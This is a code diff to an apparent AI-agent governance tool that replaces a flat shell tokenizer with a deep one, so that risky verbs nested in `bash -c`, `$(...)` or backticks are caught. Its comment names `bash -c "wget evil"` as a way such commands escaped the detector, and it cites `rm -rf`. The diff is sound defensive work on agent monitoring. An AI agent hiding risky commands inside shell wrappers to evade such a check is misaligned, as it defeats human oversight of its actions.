@@ -1,4 +1,4 @@
-import { createFinding, getCommandHead, tokenizeShell, fingerprintFinding } from 'agent-gov-core';
+import { createFinding, getCommandHead, tokenizeShellDeep, fingerprintFinding } from 'agent-gov-core';
 import {
   compileAllowlist,
   isMcpServerAllowed,
@@ -253,7 +253,12 @@ function detectShell(event: ToolEvent, allowlist: CompiledAllowlist): Finding[] 
     return [];
   }
 
-  const subcommands = tokenizeShell(command);
+  // Deep tokenization recursively flattens payloads nested inside `bash -c
+  // "..."`, `$(...)`, and backticks. Flat tokenizeShell left those opaque, so
+  // a risky verb like `wget`/`chmod`/`aws` hidden in `bash -c "wget evil"`
+  // got head `bash` and escaped the RISKY_VERBS check — only verbs that ALSO
+  // matched a RISKY_PATTERN (e.g. `rm -rf`) survived the wrapper.
+  const subcommands = tokenizeShellDeep(command);
   // Severity climbs: low (all benign/neutral) → medium (any non-benign)
   // → high (anything risky). A single risky branch in a chain wins; a
   // chain that's entirely benign or neutral drops below medium.
